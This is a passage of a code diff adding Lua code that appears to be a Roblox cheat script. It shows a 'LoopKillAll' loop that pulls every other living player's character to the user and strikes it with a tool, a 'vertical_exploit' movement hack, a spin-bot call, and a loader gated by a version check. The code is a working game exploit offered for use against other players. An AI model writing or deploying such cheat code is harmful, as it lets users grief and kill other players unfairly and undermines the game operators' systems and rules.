+                                BringTarget(player.Character:FindFirstChildOfClass("Part"))
+                                SwingTool()
+                            end
+                        else
+                            CheckIfEquipped()
+                            BringTarget(player.Character:FindFirstChildOfClass("Part"))
+                            SwingTool()
+                        end
+                    end
+                    
+                    if getgenv().LoopKillAll == true and player ~= game.Players.LocalPlayer and 
+                       player.Character and player.Character:FindFirstChildOfClass("MeshPart") and
+                       game.Players.LocalPlayer.Character and 
+                       game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                        
+                        if player.Character:FindFirstChild("Humanoid") then
+                            if player.Character:FindFirstChild("Humanoid").Health > 0 then
+                                CheckIfEquipped()
+                                BringTarget(player.Character:FindFirstChildOfClass("MeshPart"))
+                                SwingTool()
+                            end
+                        else
+                            CheckIfEquipped()
+                            BringTarget(player.Character:FindFirstChildOfClass("MeshPart"))
+                            SwingTool()
+                        end
+                    end
+                end
+                task.wait()
+            until shouldStop == true
+        end)
+    end)
+    
+    task.defer(function()
+        game.Players.LocalPlayer.CharacterAdded:Connect(function(character)
+            if getgenv().SpamTool then
+                unequipTool()
+            end
+        end)
+    end)
+    
+    spawn(function()
+        while true do
+            local duration = 0.1
+            local height = 20
+            
+            if getgenv().vertical_exploit then
+                local TweenService = game:GetService("TweenService")
+                local player = game.Players.LocalPlayer
+                local character = player.Character or player.CharacterAdded:Wait()
+                local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+                
+                local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+                local upTweenGoal = {CFrame = humanoidRootPart.CFrame * CFrame.new(0, height, 0)}
+                local downTweenGoal = {CFrame = humanoidRootPart.CFrame}
+                
+                local upTween = TweenService:Create(humanoidRootPart, tweenInfo, upTweenGoal)
+                local downTween = TweenService:Create(humanoidRootPart, tweenInfo, downTweenGoal)
+                
+                upTween:Play()
+                upTween.Completed:Connect(function()
+                    downTween:Play()
+                end)
+            end
+            
+            task.wait(duration * 2)
+        end
+    end)
+    
+    SpinBot()
+end
+
+if checkVersion() == true then
+    load_primordium_ff()
+end
